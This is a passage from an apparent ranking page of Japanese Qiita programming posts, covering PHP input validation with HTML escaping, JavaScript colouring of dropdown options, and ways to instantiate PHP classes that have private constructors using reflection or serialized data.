<span class="k">function</span> <span class="nf">h</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
<span class="p">}</span>

<span class="c1">// $_GET['my_name'] が定義されており、且つ文字列であるかどうか調べる</span>
<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'my_name'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">is_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'my_name'</span><span class="p">]))</span> <span class="p">{</span>
    <span class="c1">// 定義されていて文字列であればそのまま$my_nameに代入</span>
    <span class="nv">$my_name</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'my_name'</span><span class="p">];</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="c1">// 未定義か配列ならば「名無し」として設定</span>
    <span class="nv">$my_name</span> <span class="o">=</span> <span class="s1">'名無し'</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// Content-Typeヘッダー送信</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/xhtml+xml; charset=utf-8'</span><span class="p">);</span>

<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">"http://www.w3.org/1999/xhtml"</span> <span class="na">lang</span><span class="o">=</span><span class="s">"ja"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Hello!!<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>こんにちは、<span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$my_name</span><span class="p">)</span><span class="cp">?&gt;</span>さん！<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div></div>

<h3>
<span id="確認-1" class="fragment"></span><a href="#%E7%A2%BA%E8%AA%8D-1"><i class="fa fa-link"></i></a>確認</h3>

<p>もう一度直接アクセスを行い、「こんにちは、名無しさん！」と表示されれば成功です。</p>

<h1>
<span id="エラーは発生しないが想定外の入力として処理したいケース" class="fragment"></span><a href="#%E3%82%A8%E3%83%A9%E3%83%BC%E3%81%AF%E7%99%BA%E7%94%9F%E3%81%97%E3%81%AA%E3%81%84%E3%81%8C%E6%83%B3%E5%AE%9A%E5%A4%96%E3%81%AE%E5%85%A5%E5%8A%9B%E3%81%A8%E3%81%97%E3%81%A6%E5%87%A6%E7%90%86%E3%81%97%E3%81%9F%E3%81%84%E3%82%B1%E3%83%BC%E3%82%B9"><i class="fa fa-link"></i></a>エラーは発生しないが想定外の入力として処理したいケース</h1>

<h2>
<span id="3-名前が空欄で送信されたとき" class="fragment"></span><a href="#3-%E5%90%8D%E5%89%8D%E3%81%8C%E7%A9%BA%E6%AC%84%E3%81%A7%E9%80%81%E4%BF%A1%E3%81%95%E3%82%8C%E3%81%9F%E3%81%A8%E3%81%8D"><i class="fa fa-link"></i></a>3. 名前が空欄で送信されたとき</h2>

<h3>
<span id="問題の発生-2" class="fragment"></span><a href="#%E5%95%8F%E9%A1%8C%E3%81%AE%E7%99%BA%E7%94%9F-2"><i class="fa fa-link"></i></a>問題の発生</h3>

<p><code>form.php</code> から名前が空欄のまま送信してみましょう。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>こんにちは、さん！
</pre></div></div>

<p>このときにもぜひ「名無しさん」と表示させたいですよね。</p>

<h3>
<span id="解決策-2" class="fragment"></span><a href="#%E8%A7%A3%E6%B1%BA%E7%AD%96-2"><i class="fa fa-link"></i></a>解決策</h3>

<p><strong><code>!==</code></strong> 演算子を使って、 <code>$_GET['my_name']</code> が <strong>空欄(空文字列)</strong> になって<ins>いない</ins>かどうか確認します。</p>

<p>以下のように <code>welcome.php</code> の書き換えを行ってください。</p>

<div class="code-frame" data-lang="html+php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>

<span class="sd">/**</span>
<span class="sd"> * HTML特殊文字をエスケープする関数</span>
<span class="sd"> */</span>
<span class="k">function</span> <span class="nf">h</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="nx">ENT_QUOTES</span><span class="p">,</span> <span class="s1">'UTF-8'</span><span class="p">);</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span>
    <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'my_name'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="c1">// $_GET['my_name'] が定義されており、</span>
    <span class="nb">is_string</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'my_name'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="c1">// 且つ文字列であり、</span>
    <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'my_name'</span><span class="p">]</span> <span class="o">!==</span> <span class="s1">''</span> <span class="c1">// 且つ空欄でないかどうか調べる</span>
<span class="p">)</span> <span class="p">{</span>
    <span class="c1">// 条件をすべて満たせばそのまま$my_nameに代入</span>
    <span class="nv">$my_name</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'my_name'</span><span class="p">];</span>
<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
    <span class="c1">// 1つでも満たさないものがあれば「名無し」として設定</span>
    <span class="nv">$my_name</span> <span class="o">=</span> <span class="s1">'名無し'</span><span class="p">;</span>
<span class="p">}</span>

<span class="c1">// Content-Typeヘッダー送信</span>
<span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: application/xhtml+xml; charset=utf-8'</span><span class="p">);</span>

<span class="cp">?&gt;</span>
<span class="cp">&lt;!DOCTYPE html&gt;</span>
<span class="p">&lt;</span><span class="nt">html</span> <span class="na">xmlns</span><span class="o">=</span><span class="s">"http://www.w3.org/1999/xhtml"</span> <span class="na">lang</span><span class="o">=</span><span class="s">"ja"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>Hello!!<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
  <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>こんにちは、<span class="cp">&lt;?</span><span class="o">=</span><span class="nx">h</span><span class="p">(</span><span class="nv">$my_name</span><span class="p">)</span><span class="cp">?&gt;</span>さん！<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
</pre></div></div>

<h3>
<span id="確認-2" class="fragment"></span><a href="#%E7%A2%BA%E8%AA%8D-2"><i class="fa fa-link"></i></a>確認</h3>

<p>もう一度空欄にして送信を行い、「こんにちは、名無しさん！」と表示されれば成功です。</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />58位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>14</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/1cf314b984a6d26e6ae6">IE以外のブラウザでドロップダウンリストの各項目に色を付けたいとき</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-09-06 21:22:25</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[JavaScript]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">select</span> <span class="na">name</span><span class="o">=</span><span class="s">"color"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">option</span> <span class="na">style</span><span class="o">=</span><span class="s">"color:black;"</span> <span class="na">selected</span><span class="p">&gt;</span>選択してください<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">option</span> <span class="na">style</span><span class="o">=</span><span class="s">"color:red;"</span><span class="p">&gt;</span>赤<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">option</span> <span class="na">style</span><span class="o">=</span><span class="s">"color:yellow;"</span><span class="p">&gt;</span>黄<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">option</span> <span class="na">style</span><span class="o">=</span><span class="s">"color:blue;"</span><span class="p">&gt;</span>青<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">select</span><span class="p">&gt;</span>
</pre></div></div>

<p>InternetExplolerは選択後のselect要素自体の色も自動的に変更してくれるようですが、FirefoxやGoogleChromeではselect要素を直接操作しない限りデフォルト色のままになってしまうようです。<br>
これを解決するためにJavaScriptド素人の私なりに思いついたのが以下のコードです。<br>
既出だったら申し訳ないというか多分既出だと思いますが。</p>

<div class="code-frame" data-lang="js"><div class="highlight"><pre><span></span><span class="kd">function</span> <span class="nx">changeColor</span><span class="p">()</span> <span class="p">{</span>
    <span class="kd">var</span> <span class="nx">e</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">"color"</span><span class="p">);</span>
    <span class="nx">e</span><span class="p">.</span><span class="nx">style</span><span class="p">.</span><span class="nx">color</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">options</span><span class="p">[</span><span class="nx">e</span><span class="p">.</span><span class="nx">selectedIndex</span><span class="p">].</span><span class="nx">style</span><span class="p">.</span><span class="nx">color</span><span class="p">;</span>
<span class="p">}</span>
</pre></div></div>

<div class="code-frame" data-lang="html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">select</span> <span class="na">name</span><span class="o">=</span><span class="s">"color"</span> <span class="na">id</span><span class="o">=</span><span class="s">"color"</span> <span class="na">onchange</span><span class="o">=</span><span class="s">"changeColor()"</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">option</span> <span class="na">style</span><span class="o">=</span><span class="s">"color:black;"</span> <span class="na">selected</span><span class="p">&gt;</span>選択してください<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">option</span> <span class="na">style</span><span class="o">=</span><span class="s">"color:red;"</span><span class="p">&gt;</span>赤<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">option</span> <span class="na">style</span><span class="o">=</span><span class="s">"color:yellow;"</span><span class="p">&gt;</span>黄<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
<span class="p">&lt;</span><span class="nt">option</span> <span class="na">style</span><span class="o">=</span><span class="s">"color:blue;"</span><span class="p">&gt;</span>青<span class="p">&lt;/</span><span class="nt">option</span><span class="p">&gt;</span>
<span class="p">&lt;/</span><span class="nt">select</span><span class="p">&gt;</span>
</pre></div></div>

<p>とりあえずGoogleChromeではこれで動作確認できました。<br>
「こうしたほうがいい」等指摘があれば生暖かいコメントお願いします（（（</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1">
<tr>
	<td rowspan="3"><center>mpywさんの<br />59位</center></td>
	<td colspan="3">
		<kbd><i><img alt="いいね" width="16" height="16" src="../thumb-up-120px.png" /></i>13</kbd>
		<a target="_blank" href="https://qiita.com/mpyw/items/b3d974c073e6484d51a4">private, protected なコンストラクタを外部からコールする方法</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2013-12-19 18:20:12</center>
	</td>
	<td style="width:200px;">
		@mpyw<br />(シナプス株式会社 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/25060/profile-images/1473684251">
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[PHP]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;">
<h1>
<span id="導入" class="fragment"></span><a href="#%E5%B0%8E%E5%85%A5"><i class="fa fa-link"></i></a>導入</h1>

<p>private, protected なコンストラクタを特別に許可した外部クラスからコールしたいとき。</p>

<p><strong>「 RefletcionClass 使えばいけるんじゃねーの？」</strong></p>

<p>って思うかもしれませんが・・・</p>

<p><a href="https://camo.qiitausercontent.com/8bc5910380040264874706f1d3f2fb6ece45c8df/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f39393761303635352d353434352d636464342d613635362d6536646330653738633830372e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/8bc5910380040264874706f1d3f2fb6ece45c8df/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f39393761303635352d353434352d636464342d613635362d6536646330653738633830372e706e67" alt="ss (2013-12-19 at 04.22.00).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/997a0655-5445-cdd4-a656-e6dc0e78c807.png"></a></p>

<p><a href="https://camo.qiitausercontent.com/0b3da52caf32312c311490f38614766d487060fd/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f31613438373464332d363466302d613639662d643332662d6534623231623334353231312e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/0b3da52caf32312c311490f38614766d487060fd/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f31613438373464332d363466302d613639662d643332662d6534623231623334353231312e706e67" alt="ss (2013-12-19 at 04.22.50).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/1a4874d3-64f0-a69f-d32f-e4b21b345211.png"></a></p>

<p><strong>ReflectionMethod::invoke()</strong> の <em><code>$object</code></em> に何渡したらいいねん、ってなりますよね。コンストラクタをコールする段階ではまだインスタンスを作っていないので、この方法は使えません。ではどうするか・・・？</p>

<h1>
<span id="解決策1-自前でシリアルデータを書く" class="fragment"></span><a href="#%E8%A7%A3%E6%B1%BA%E7%AD%961-%E8%87%AA%E5%89%8D%E3%81%A7%E3%82%B7%E3%83%AA%E3%82%A2%E3%83%AB%E3%83%87%E3%83%BC%E3%82%BF%E3%82%92%E6%9B%B8%E3%81%8F"><i class="fa fa-link"></i></a>解決策1: 自前でシリアルデータを書く</h1>

<p>private とか protected なときに <strong>NULL文字</strong> 使って変なフォーマットにしなければいけないので結構めんどくさいです。</p>

<p>ここでは簡単のためにメソッドではなく関数として表現します。実際にクラスに組み込むときには <code>function</code> ではなくて <code>private static function</code> 等にしてください。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">関数定義</span></div>
<div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">getInstance</span><span class="p">(</span><span class="nv">$class</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$properties</span> <span class="o">=</span> <span class="k">array</span><span class="p">())</span> <span class="p">{</span>
    <span class="nv">$r</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ReflectionClass</span><span class="p">(</span><span class="nv">$class</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span>
        <span class="nv">$r</span><span class="o">-&gt;</span><span class="na">isAbstract</span><span class="p">()</span> <span class="o">||</span>
        <span class="nv">$r</span><span class="o">-&gt;</span><span class="na">isInterface</span><span class="p">()</span> <span class="o">||</span>
        <span class="nb">version_compare</span><span class="p">(</span><span class="k">PHP_VERSION</span><span class="p">,</span> <span class="s1">'5.4.0'</span><span class="p">,</span> <span class="s1">'&gt;='</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$r</span><span class="o">-&gt;</span><span class="na">isTrait</span><span class="p">()</span>
    <span class="p">)</span> <span class="p">{</span>
        <span class="k">throw</span> <span class="k">new</span> <span class="nx">InvalidArgumentException</span><span class="p">(</span><span class="s2">"</span><span class="si">{</span><span class="nv">$r</span><span class="o">-&gt;</span><span class="na">name</span><span class="si">}</span><span class="s2"> is not instantiable"</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="nv">$serials</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$r</span><span class="o">-&gt;</span><span class="na">getProperties</span><span class="p">()</span> <span class="k">as</span> <span class="nv">$rp</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$rp</span><span class="o">-&gt;</span><span class="na">isStatic</span><span class="p">()</span> <span class="o">||</span> <span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$properties</span><span class="p">[</span><span class="nv">$rp</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">]))</span> <span class="p">{</span>
            <span class="k">continue</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">if</span> <span class="p">(</span><span class="nv">$rp</span><span class="o">-&gt;</span><span class="na">isPrivate</span><span class="p">())</span> <span class="p">{</span>
            <span class="nv">$serials</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="s2">"</span><span class="se">\0</span><span class="si">{</span><span class="nv">$r</span><span class="o">-&gt;</span><span class="na">name</span><span class="si">}</span><span class="se">\0</span><span class="si">{</span><span class="nv">$rp</span><span class="o">-&gt;</span><span class="na">name</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">elseif</span> <span class="p">(</span><span class="nv">$rp</span><span class="o">-&gt;</span><span class="na">isProtected</span><span class="p">())</span> <span class="p">{</span>
            <span class="nv">$serials</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="s2">"</span><span class="se">\0</span><span class="s2">*</span><span class="se">\0</span><span class="si">{</span><span class="nv">$rp</span><span class="o">-&gt;</span><span class="na">name</span><span class="si">}</span><span class="s2">"</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="nv">$serials</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$rp</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">);</span>
        <span class="p">}</span>
        <span class="nv">$serials</span><span class="p">[]</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$properties</span><span class="p">[</span><span class="nv">$rp</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">]);</span>
    <span class="p">}</span>
    <span class="k">return</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nb">sprintf</span><span class="p">(</span>
        <span class="s1">'O:%d:"%s":%d:{%s}'</span><span class="p">,</span>
        <span class="nb">strlen</span><span class="p">(</span><span class="nv">$r</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">),</span>
        <span class="nv">$r</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">,</span>
        <span class="nb">count</span><span class="p">(</span><span class="nv">$serials</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span><span class="p">,</span>
        <span class="nb">implode</span><span class="p">(</span><span class="s1">''</span><span class="p">,</span> <span class="nv">$serials</span><span class="p">)</span>
    <span class="p">));</span>
<span class="p">}</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">テストコード</span></div>
<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">Test</span> <span class="p">{</span>

    <span class="k">public</span> <span class="nv">$a</span> <span class="o">=</span> <span class="s1">'default'</span><span class="p">;</span>
    <span class="k">protected</span> <span class="nv">$b</span> <span class="o">=</span> <span class="s1">'default'</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$c</span> <span class="o">=</span> <span class="s1">'default'</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$d</span> <span class="o">=</span> <span class="s1">'default'</span><span class="p">;</span>

    <span class="k">private</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span> <span class="p">}</span>

<span class="p">}</span>

<span class="nb">var_dump</span><span class="p">(</span><span class="nx">getInstance</span><span class="p">(</span>
    <span class="s1">'Test'</span><span class="p">,</span>
    <span class="nb">array_fill_keys</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="s1">'a'</span><span class="p">,</span> <span class="s1">'c'</span><span class="p">),</span> <span class="s1">'new'</span><span class="p">)</span>
<span class="p">));</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span><span class="nx">object</span><span class="p">(</span><span class="nx">Test</span><span class="p">)</span> <span class="o">...</span> <span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
  <span class="p">[</span><span class="s2">"a"</span><span class="p">]</span><span class="o">=&gt;</span>
  <span class="nx">string</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="s2">"new"</span>
  <span class="p">[</span><span class="s2">"b"</span><span class="o">:</span><span class="k">protected</span><span class="p">]</span><span class="o">=&gt;</span>
  <span class="nx">string</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="s2">"new"</span>
  <span class="p">[</span><span class="s2">"c"</span><span class="o">:</span><span class="s2">"Test"</span><span class="o">:</span><span class="k">private</span><span class="p">]</span><span class="o">=&gt;</span>
  <span class="nx">string</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="s2">"new"</span>
  <span class="p">[</span><span class="s2">"d"</span><span class="p">]</span><span class="o">=&gt;</span>
  <span class="nx">string</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span> <span class="s2">"default"</span>
<span class="p">}</span>
</pre></div>
</div>

<p>この方法だと<ins>実際にはコンストラクタをコールしていない</ins>ため、プロパティへのセット以外の操作をコンストラクタ相当に行いたい場合には対応しきれないケースが発生してきます。それが必要な場合は解決策2に帰着することになります。</p>

<h1>
<span id="解決策2-private-static-なファクトリメソッドを用意しておく" class="fragment"></span><a href="#%E8%A7%A3%E6%B1%BA%E7%AD%962-private-static-%E3%81%AA%E3%83%95%E3%82%A1%E3%82%AF%E3%83%88%E3%83%AA%E3%83%A1%E3%82%BD%E3%83%83%E3%83%89%E3%82%92%E7%94%A8%E6%84%8F%E3%81%97%E3%81%A6%E3%81%8A%E3%81%8F"><i class="fa fa-link"></i></a>解決策2: private static なファクトリメソッドを用意しておく</h1>

<p>最初に <strong>ReflectionMethod::invoke()</strong> が使えないと断念しましたが、そもそもファクトリメソッドがあればいい話です。但し <strong>ReflectionMethod::setAccessible()</strong> は <ins>PHP5.3.2以降</ins> でしか使えません。</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">関数定義</span></div>
<div class="highlight"><pre><span></span><span class="k">function</span> <span class="nf">getInstance</span><span class="p">(</span><span class="nv">$class</span><span class="p">,</span> <span class="k">array</span> <span class="nv">$arguments</span> <span class="o">=</span> <span class="k">array</span><span class="p">())</span> <span class="p">{</span>
    <span class="nv">$r</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">ReflectionClass</span><span class="p">(</span><span class="nv">$class</span><span class="p">);</span>
    <span class="nv">$rm</span> <span class="o">=</span> <span class="nv">$r</span><span class="o">-&gt;</span><span class="na">getMethod</span><span class="p">(</span><span class="s1">'factory'</span><span class="p">);</span>
    <span class="nv">$rm</span><span class="o">-&gt;</span><span class="na">setAccessible</span><span class="p">(</span><span class="k">true</span><span class="p">);</span>
    <span class="k">return</span> <span class="nv">$rm</span><span class="o">-&gt;</span><span class="na">invoke</span><span class="p">(</span><span class="k">null</span><span class="p">,</span> <span class="nv">$arguments</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">テストコード</span></div>
<div class="highlight"><pre><span></span><span class="k">class</span> <span class="nc">Test</span> <span class="p">{</span>

    <span class="k">public</span> <span class="nv">$a</span> <span class="o">=</span> <span class="s1">'default'</span><span class="p">;</span>
    <span class="k">protected</span> <span class="nv">$b</span> <span class="o">=</span> <span class="s1">'default'</span><span class="p">;</span>
    <span class="k">private</span> <span class="nv">$c</span> <span class="o">=</span> <span class="s1">'default'</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$d</span> <span class="o">=</span> <span class="s1">'default'</span><span class="p">;</span>

    <span class="k">private</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span> <span class="p">{</span> <span class="p">}</span>

    <span class="k">private</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">factory</span><span class="p">(</span><span class="k">array</span> <span class="nv">$properties</span> <span class="o">=</span> <span class="k">array</span><span class="p">())</span> <span class="p">{</span>
        <span class="nv">$object</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">self</span><span class="p">;</span>
        <span class="nv">$properties</span> <span class="o">=</span> <span class="nb">array_intersect_key</span><span class="p">(</span><span class="nv">$properties</span><span class="p">,</span> <span class="nb">get_object_vars</span><span class="p">(</span><span class="nv">$object</span><span class="p">));</span>
        <span class="k">foreach</span> <span class="p">(</span><span class="nv">$properties</span> <span class="k">as</span> <span class="nv">$name</span> <span class="o">=&gt;</span> <span class="nv">$value</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$object</span><span class="o">-&gt;</span><span class="nv">$name</span> <span class="o">=</span> <span class="nv">$value</span><span class="p">;</span>
        <span class="p">}</span>
        <span class="k">return</span> <span class="nv">$object</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span>

<span class="nb">var_dump</span><span class="p">(</span><span class="nx">getInstance</span><span class="p">(</span>
    <span class="s1">'Test'</span><span class="p">,</span>
    <span class="nb">array_fill_keys</span><span class="p">(</span><span class="nb">range</span><span class="p">(</span><span class="s1">'a'</span><span class="p">,</span> <span class="s1">'c'</span><span class="p">),</span> <span class="s1">'new'</span><span class="p">)</span>
<span class="p">));</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">実行結果</span></div>
<div class="highlight"><pre><span></span><span class="nx">object</span><span class="p">(</span><span class="nx">Test</span><span class="p">)</span> <span class="o">...</span> <span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="p">{</span>
  <span class="p">[</span><span class="s2">"a"</span><span class="p">]</span><span class="o">=&gt;</span>
  <span class="nx">string</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="s2">"new"</span>
  <span class="p">[</span><span class="s2">"b"</span><span class="o">:</span><span class="k">protected</span><span class="p">]</span><span class="o">=&gt;</span>
  <span class="nx">string</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="s2">"new"</span>
  <span class="p">[</span><span class="s2">"c"</span><span class="o">:</span><span class="s2">"Test"</span><span class="o">:</span><span class="k">private</span><span class="p">]</span><span class="o">=&gt;</span>
  <span class="nx">string</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="s2">"new"</span>
  <span class="p">[</span><span class="s2">"d"</span><span class="p">]</span><span class="o">=&gt;</span>
  <span class="nx">string</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span> <span class="s2">"default"</span>
<span class="p">}</span>
</pre></div>
</div>

<h1>
<span id="解決策3-closurebind-と-reflectionclassnewinstancewithoutconstructor" class="fragment"></span><a href="#%E8%A7%A3%E6%B1%BA%E7%AD%963-closurebind-%E3%81%A8-reflectionclassnewinstancewithoutconstructor"><i class="fa fa-link"></i></a>解決策3: Closure::bind() と ReflectionClass::newInstanceWithoutConstructor()</h1>

<p><a href="http://qiita.com/suin">suinさん</a>の以下の投稿を参考にさせていただきました。</p>

<h4>
